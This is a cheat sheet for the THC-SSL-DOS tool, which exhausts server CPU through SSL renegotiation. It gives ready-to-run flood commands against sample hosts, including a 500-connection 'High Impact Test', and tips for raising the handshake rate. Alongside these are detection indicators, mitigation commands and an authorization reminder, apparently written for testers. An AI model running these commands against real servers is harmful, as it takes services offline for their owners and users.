# THC-SSL-DOS Quick Reference

## Installation

```bash
sudo apt install thc-ssl-dos
```

## Basic Commands

| Command | Description |
|---------|-------------|
| `thc-ssl-dos <ip> <port>` | Basic attack (default) |
| `thc-ssl-dos -l 100 <ip> 443` | 100 connections |
| `thc-ssl-dos --accept <ip> 443` | Accept invalid certs |
| `thc-ssl-dos -l 200 --accept <ip> 443` | High connection test |

## Options Reference

```
-l, --limit NUM    # Number of connections
--accept           # Accept certificate errors
-v, --verbose      # Verbose output
-h, --help         # Show help
```

## Quick Scenarios

### Basic SSL Test
```bash
thc-ssl-dos 192.168.1.100 443
```

### Web Server Testing
```bash
thc-ssl-dos -l 100 --accept example.com 443
```

### VPN Gateway Test
```bash
thc-ssl-dos -l 50 --accept vpn.company.com 443
```

### High Impact Test
```bash
thc-ssl-dos -l 500 --accept target.com 443
```

## Output Interpretation

```
Handshakes N [X.XX h/s], Y Conn, Z Err
```

| Field | Meaning |
|-------|---------|
| Handshakes | Completed SSL handshakes |
| h/s | Handshakes per second |
| Conn | Active connections |
| Err | Failed connections |

## How It Works

1. Client initiates SSL handshake
2. Server performs heavy RSA operations
3. Client triggers renegotiation
4. Repeat thousands of times on single connection
5. Server CPU exhausted (1:15 cost ratio)

## Detection Indicators

- High SSL handshake rate from single IP
- Multiple renegotiation requests
- Server CPU spike
- Connection count increase

## Defense Quick Fixes

```bash
# Disable renegotiation (Apache)
echo "SSLInsecureRenegotiation off" >> /etc/apache2/conf-enabled/ssl.conf
systemctl restart apache2

# Connection limits (iptables)
iptables -A INPUT -p tcp --dport 443 -m connlimit --connlimit-above 50 -j DROP
```

## Test SSL Configuration

```bash
# Check if renegotiation is enabled
openssl s_client -connect target.com:443

# Test SSL handshake
nmap --script ssl-enum-ciphers -p 443 target.com
```

## Common Ports

| Port | Service |
|------|---------|
| 443 | HTTPS |
| 465 | SMTPS |
| 993 | IMAPS |
| 995 | POP3S |
| 8443 | Alternative HTTPS |

## System Requirements

- Root/sudo privileges
- libpcap installed
- OpenSSL libraries
- Network access to target SSL port

## Troubleshooting

| Issue | Solution |
|-------|----------|
| Connection refused | Verify SSL port is open |
| Certificate error | Use `--accept` flag |
| Low handshake rate | Increase `-l` connections |
| No output | Check firewall rules |

## Legal Reminder

**Authorization required!** This tool tests SSL/TLS resilience. Use only on systems you own or have permission to test.
